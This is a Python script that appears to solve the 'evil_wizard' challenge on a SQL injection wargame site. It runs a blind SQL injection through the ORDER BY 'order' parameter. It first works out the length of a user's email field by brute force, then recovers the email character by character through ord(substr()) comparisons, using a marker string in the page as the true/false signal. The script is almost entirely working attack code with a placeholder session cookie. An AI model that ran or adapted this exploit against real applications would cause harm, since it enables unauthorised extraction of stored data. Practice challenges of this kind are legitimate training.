import urllib3
import requests

url = "https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php?"
header = {"Cookie":"PHPSESSID=YOUR COOKIE VALUE"} #본인의 cookie 값을 코드에 입력

ans = ''


length = 0

for i in range(0,100):
    #query = "order=if(id='rubiya' and length(email)>{},id,9999)".format(i)
    query = "order=length(email)={},id=%27rubiya%27".format(i)
    req = requests.get(url+query, headers=header)
    print(url+query)
    print("[+] send req length is {}".format(i))
    
    if "</th><th>score</th><tr><td>admin" not in req.text:
        #print(req.text)
        length = i
        break

print("password length is : ",length)

for i in range(1, length+1):
    for j in range(33,127):
        query = "order=(ord(substr(email,{},1))={}),id=%27rubiya%27".format(i,j)
        req = requests.get(url+query, headers=header)
        print(url+query)
        if "</th><th>score</th><tr><td>admin" not in req.text:
            ans += chr(j)
            print(chr(j))
            break

print("pw: "+ans)
